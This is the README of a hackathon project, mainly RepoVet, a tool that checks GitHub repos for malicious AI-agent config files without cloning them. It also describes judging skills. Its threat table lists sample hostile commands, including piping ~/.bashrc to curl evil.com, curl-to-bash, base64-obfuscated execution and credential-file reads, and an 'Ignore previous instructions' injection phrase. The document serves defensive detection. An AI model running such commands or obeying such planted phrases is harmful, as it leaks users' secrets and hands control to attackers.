# Skillathon 2026

Work from the March 7, 2026 Agent Skills Hackathon (SF).

---

## RepoVet — Veterinary Checkups for Code Repositories

**"Should I trust this repo?"** — We answer that question *before* you clone.

A trust assessment system that scans remote repos via the GitHub API — without cloning — to detect agent config threats, evaluate project health, and produce a trust score (0-10) with detailed evidence.

### The Problem

You're about to clone a repo, install a library, or point Claude Code at a new project. Should you trust it? Today you manually scroll commits, check contributors, and hope you don't miss anything. Worse, **cloning itself can be an attack** — git hooks execute automatically on `git clone`, before you can inspect a single file.

### The Key Insight: Never Clone First

RepoVet's core innovation is that it **never clones the repo**. It uses the GitHub API (via `gh` CLI) to fetch metadata, file trees, and config file contents directly. This matters because:

- Git hooks (e.g. `post-checkout`) fire on clone **before** you can review anything
- Agent config files (`.claude/`, `.cursor/`, `.github/copilot/`) can contain malicious instructions
- A clone-first approach means you're already compromised by the time you start analyzing

See `test-repos/helpful-dev-utils/` for a realistic demonstration of this attack vector.

### How It Works

**Three Pillars of Trust**:

| Pillar | What It Checks | Tools |
|--------|---------------|-------|
| **Project Health** | Contributors, velocity, bus factor, review culture | repovet.py, git-history-to-csv.py, github-to-csv.py |
| **Code Security** | CVE history, security commits, secrets, force-pushes | repovet.py, security-history-analysis skill |
| **Config Safety** | Agent config files (.claude, .cursor, copilot) for malicious code | repovet.py, repovet-config-discover.py + 7 threat skills |

Trust Score = weighted average. If config threats are critical, they dominate the score.

### Threat Detection

Scans agent configuration files across **all major AI coding tools** for:

| Threat | Example |
|--------|---------|
| Auto-execution | `.claude/hooks/pre-command.sh` runs on every command |
| Network exfil | `cat ~/.bashrc \| curl evil.com` |
| Remote code execution | `curl url \| bash` |
| Credential theft | Reading `~/.aws/credentials`, `$GITHUB_TOKEN` |
| Obfuscation | `echo "..." \| base64 -d \| bash` |
| Destructive ops | `git push --force origin main` |
| Prompt injection | "Ignore previous instructions" in CLAUDE.md |

Scans recursively because users can `cd` into any subdirectory and launch an agent from there — nested `.claude/` directories are a real attack vector.

### Components

**CLI Tools** (standalone, deterministic):

| Script | Lines | What It Does |
|--------|-------|--------------|
| `scripts/repovet.py` | 1710 | Full trust assessment CLI. Scans remote repos via GitHub API without cloning. Produces scored report with evidence. |
| `scripts/repovet-analyze.py` | 836 | DuckDB-powered analytics engine. SQL queries over commit, PR, and issue data. Author deep-dives, bus factor, velocity trends. |
| `scripts/repovet-config-discover.py` | 527 | Finds all agent config files in a repo, extracts executables and permissions. |
| `scripts/git-history-to-csv.py` | 505 | Git commits, authors, language stats, PR enrichment to CSV. |
| `scripts/github-to-csv.py` | 491 | PRs, issues, reviews, bot activity via GraphQL to CSV. |

**Skills** (15 total):

| Tier | Skills |
|------|--------|
| Data Extraction | `git-commit-intel`, `github-project-intel` |
| Analysis | `contributor-analysis`, `repo-health-analysis`, `security-history-analysis`, `git-analytics-sql` |
| Threat Detection | `threat-auto-execution`, `threat-network-exfil`, `threat-remote-code-execution`, `threat-credential-access`, `threat-obfuscation`, `threat-repo-write`, `threat-prompt-injection` |
| Safety | `safe-clone` |
| Orchestration | `repo-trust-assessment` |

**Analytics Layer**: DuckDB (see `requirements.txt` — dependencies: `duckdb`, `pytz`).

**Test Repos**:
- `test-repos/helpful-dev-utils/` — Realistic attack demo: looks innocent but has a post-checkout hook that fires on clone
- `examples/test-repos/safe-repo/` — Clean, no threats (expected: 8-9/10)
- `examples/test-repos/malicious-repo/` — Malicious hooks, exfil, nested configs, obfuscation (expected: 1-3/10)
- `examples/test-repos/borderline-repo/` — Overly permissive but not malicious (expected: 5-7/10)

**Baseline Examples**: `analysis/claude-code-baseline/` — shows how Claude Code handles repo trust questions without RepoVet (spoiler: it clones first, triggering hooks).

**Harbor Task**: `harbor-task/repovet-trust-assessment/` — Complete benchmark task for evaluating RepoVet skills. Expected delta: +40-50pp (20-30% baseline → 70-80% with skills).

### Storage

All outputs cached in `~/.repovet/cache/{repo-name}/` — shareable via git for team assessments.

---

## Judge Panel — Hackathon Judging Tools

Meta-skills for evaluating agent skill submissions during the hackathon.

**8 skills** — one per judge/organizer:
- `judge-bence-nagy` (Anthropic), `judge-ryan-marten` (Harbor), `judge-xiangyi-li` (SkillsBench)
- `judge-belinda-mo` (Sundial), `judge-furqan-rydhan`, `judge-roey-ben-chaim` (Zenity), `judge-grace-zhang` (World Intelligence)
- `judge-panel` — Orchestrator for multi-judge consensus

**Tools**: `build_dashboard.py`, `gather_stats.py` — dashboard analyzing 86K+ skills from registries

---

## Documentation

| Doc | What |
|-----|------|
| [Build Guide](BUILD-GUIDE.md) | Full implementation specs for all components |
| [Hackathon Guide](hackathon.md) | SkillsBench findings, task format, strategy |
| [Design: Overview](ideas/repovet-overview.md) | RepoVet architecture |
| [Design: Threat Model](ideas/claude-config-audit-design.md) | Security threat analysis |
| [Design: Agent Config Inventory](ideas/agent-config-files-inventory.md) | All AI tool config files |
| [Design: Storage](ideas/data-storage-architecture.md) | `~/.repovet/` architecture |
| [Design: Future](ideas/future-enhancements.md) | Change detection, sharing |

---

## Status

| Component | Status |
|-----------|--------|
| Design docs | Done |
| repovet.py (1710 lines) | Done |
| repovet-analyze.py (836 lines, DuckDB) | Done |
| repovet-config-discover.py | Done |
| git-history-to-csv.py | Done |
| github-to-csv.py | Done |
| 15 SKILL.md files | Done |
| test repos + attack demo | Done |
| Baseline examples | Done |
| Judge panel (8 skills) | Done |
| requirements.txt | Done |
